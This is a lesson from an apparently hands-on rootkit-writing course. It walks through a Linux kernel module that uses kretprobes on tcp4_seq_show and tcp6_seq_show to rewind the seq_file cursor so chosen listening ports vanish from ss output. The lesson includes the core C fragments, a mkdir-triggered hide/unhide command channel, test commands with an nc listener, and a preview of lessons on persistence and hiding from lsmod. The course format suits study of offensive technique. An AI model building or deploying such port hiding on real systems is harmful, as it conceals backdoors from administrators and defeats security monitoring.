# L13: Port Filter

L11 and L12 hide data by copying the buffer, removing entries, and writing it
back.
Port hiding uses a cleaner technique: rewind the seq_file write cursor so the
line is never emitted.

## How ss reads TCP sockets

`ss -tlnp` reads `/proc/net/tcp`.
The kernel generates this file by calling `tcp4_seq_show` once per TCP
connection.
Each call writes one line into a `seq_file` buffer:

```text
  ss -tlnp
    |
    v
  open + read /proc/net/tcp
    |
    v
  tcp4_seq_show(seq, sk)       <-- called per connection
    |
    v
  seq_printf(seq, " %d ...", port)
    |
    v
  seq->count advances by the bytes written
```

`seq->count` is the write cursor.
It tracks how many bytes have been written into the output buffer.
If you save `seq->count` before the function runs and restore it afterwards, the
line is erased.
No buffer copying, no memmove.
The output simply shrinks.

## The rewind trick

```c
// Entry: save the cursor position before tcp4_seq_show writes
data->saved_count = data->seq->count;

// Return: if this port should be hidden, rewind the cursor
if (port_matches)
	data->seq->count = data->saved_count;
```

This is elegant because it works at the seq_file abstraction level.
L11 and L12 work at the raw buffer level (copy, modify, write back).
Here the kernel does all the buffering; you just undo the last write.

## Extracting the port

The second argument to `tcp4_seq_show` is a `struct sock *`.
Extract the source port through the `inet_sock` layer:

```c
struct inet_sock *inet = inet_sk(data->sk);
unsigned short sport = ntohs(inet->inet_sport);
```

`inet_sport` is in network byte order.
`ntohs` converts to host order.
Compare the port number (as a string) against the target list.

## The trap

The first call to `tcp4_seq_show` passes `SEQ_START_TOKEN` (`(void *)1`) as the
sock pointer.
This is the header row ("sl  local_address ...").
If you cast `SEQ_START_TOKEN` to `struct sock *` and dereference it, you oops
the kernel.
Always check:

```c
if (data->sk == SEQ_START_TOKEN)
	return 0;  // header row, skip
```

Also: `tcp4_seq_show` and `tcp6_seq_show` are regular functions, not syscall
wrappers.
Arguments are directly in `regs->di` (seq_file) and `regs->si` (sock).
No inner pt_regs.

## You write

`main.c`, ~288 lines:

- `struct rk_tcp_show_data` (seq_file pointer, saved count, sock pointer)
- `rk_tcp_show_entry()`: save `seq->count` and `sk` from direct regs
- `rk_tcp_show_return()`: extract port, match, rewind if needed
- Two kretprobes: `tcp4_seq_show` and `tcp6_seq_show`
- mkdir dispatcher for `h.p`/`u.p` commands
- One target list: `port_targets`

## API

```c
#include <net/inet_sock.h>     // inet_sk, inet_sport
#include <linux/seq_file.h>    // struct seq_file
#include <linux/kprobes.h>

#define SEQ_START_TOKEN ((void *)1)

// Regular function: direct register access
data->seq = (struct seq_file *)regs->di;
data->saved_count = data->seq->count;
data->sk = (struct sock *)regs->si;

// Port extraction
struct inet_sock *inet = inet_sk(data->sk);
unsigned short sport = ntohs(inet->inet_sport);

// Erase the line
data->seq->count = data->saved_count;
```

## Test it

The module is pre-loaded.
You are logged in as student.

```
$ nc -l -p 4444 &
[1] 5678
$ ss -tlnp | grep 4444
LISTEN  0  1  0.0.0.0:4444  0.0.0.0:*
$ mkdir rklings.h.p.4444
$ ss -tlnp | grep 4444
(no output)
$ curl localhost:4444
(connects, port still listening)
$ mkdir rklings.u.p.0
$ ss -tlnp | grep 4444
LISTEN  0  1  0.0.0.0:4444  0.0.0.0:*
```

## Validate

```
$ rklings validate l13
  [+] module loaded
  [+] port hidden from ss
  [+] hidden port still listening (curl connects)
  [+] unhide restores ss output
  PASS
```

## Next

You can now hide files, PIDs, text, and ports.
M00 adds reboot persistence and module cloaking so your rootkit survives reboots
and hides from lsmod.
